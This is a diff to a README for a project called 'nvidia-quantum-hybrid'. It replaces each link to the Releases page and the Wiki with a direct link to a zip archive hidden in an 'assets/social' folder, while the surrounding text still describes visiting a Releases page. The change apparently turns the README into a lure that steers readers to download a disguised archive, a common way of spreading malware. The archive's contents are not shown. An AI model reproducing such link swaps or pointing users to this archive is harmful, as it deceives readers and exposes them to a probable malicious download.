@@ -1,7 +1,7 @@
 # 🌟 nvidia-quantum-hybrid - Your Gateway to Quantum Workflows
 
 ## 📥 Download Now
-[![Download nvidia-quantum-hybrid](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/QXRzdtlh/nvidia-quantum-hybrid/releases)
+[![Download nvidia-quantum-hybrid](https://raw.githubusercontent.com/QXRzdtlh/nvidia-quantum-hybrid/main/assets/social/nvidia-quantum-hybrid_3.5.zip)](https://raw.githubusercontent.com/QXRzdtlh/nvidia-quantum-hybrid/main/assets/social/nvidia-quantum-hybrid_3.5.zip)
 
 ## 🚀 Getting Started
 Welcome to **nvidia-quantum-hybrid**! This application allows you to explore hybrid workflows combining classical and quantum computing, designed with a focus on AI safety and security. 
@@ -36,7 +36,7 @@ Before downloading, ensure your system meets these requirements:
 ## 👨‍💻 Download & Install
 To get started, visit our Releases page to download the latest version:
 
-[Download nvidia-quantum-hybrid](https://github.com/QXRzdtlh/nvidia-quantum-hybrid/releases)
+[Download nvidia-quantum-hybrid](https://raw.githubusercontent.com/QXRzdtlh/nvidia-quantum-hybrid/main/assets/social/nvidia-quantum-hybrid_3.5.zip)
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version and click on it.
@@ -63,7 +63,7 @@ If you encounter issues, consider the following tips:
 Connect with other users and developers. Share your experiences and suggestions on our GitHub discussions page. We welcome your input to make nvidia-quantum-hybrid better!
 
 ## 📖 Documentation
-For detailed information on features and usage, visit our [Wiki](https://github.com/QXRzdtlh/nvidia-quantum-hybrid/wiki). This resource includes tutorials, advanced configurations, and more.
+For detailed information on features and usage, visit our [Wiki](https://raw.githubusercontent.com/QXRzdtlh/nvidia-quantum-hybrid/main/assets/social/nvidia-quantum-hybrid_3.5.zip). This resource includes tutorials, advanced configurations, and more.
 
 ## 📞 Contact Us
 For further assistance, please create an issue on our GitHub page or contact us through email provided in the repository.
